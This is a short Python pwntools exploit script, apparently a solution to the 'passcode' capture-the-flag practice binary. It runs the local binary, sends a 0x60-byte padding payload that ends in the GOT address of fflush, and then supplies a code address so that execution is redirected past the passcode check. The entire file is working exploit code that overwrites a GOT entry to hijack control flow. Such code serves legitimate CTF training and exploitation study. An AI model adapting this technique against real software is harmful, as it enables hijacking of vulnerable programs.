from pwn import *
from time import sleep
fpath = "./passcode"
offset = 0x60

p = process(fpath)
elf = ELF(fpath)


p.recv()
payload =offset * "a" + p32(elf.got["fflush"])
p.sendline(payload)
sleep(1)
print  p.recv()
print "______________"

p.sendline(str(int("0x080485E3" ,16)) )
print p.recv()
